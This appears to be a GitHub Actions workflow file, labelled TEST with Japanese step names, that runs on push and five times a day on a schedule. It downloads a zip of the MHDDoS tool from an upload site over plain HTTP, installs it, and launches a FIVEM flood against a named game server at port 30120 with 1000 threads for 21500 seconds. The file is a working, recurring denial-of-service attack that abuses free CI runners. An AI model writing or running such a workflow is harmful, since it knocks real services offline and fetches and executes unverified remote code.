name: TEST

on:
  push:
  workflow_dispatch:
  schedule:
    - cron: '0 0 * * *'
    - cron: '0 5 * * *'
    - cron: '0 10 * * *'
    - cron: '0 15 * * *'
    - cron: '0 20 * * *'


jobs:

  build:


    runs-on: ubuntu-latest


    steps:

    - name: ダウンロード

      run: wget http://nkgpgc.sx3.jp/uploader51/upl/K8oCD_yYOWct3Y4mlchd/00325.zip

    - name: 展開

      run: unzip 00325.zip -d ./

    - name: コピー

      run: cp -R ./MHDDoS-2.4/* ./

    - name: インストール

      run: pip3 install -r requirements.txt

    - name: 実行

      run: python3 start.py FIVEM lovegta.sixm.f5.si:30120 1000 21500
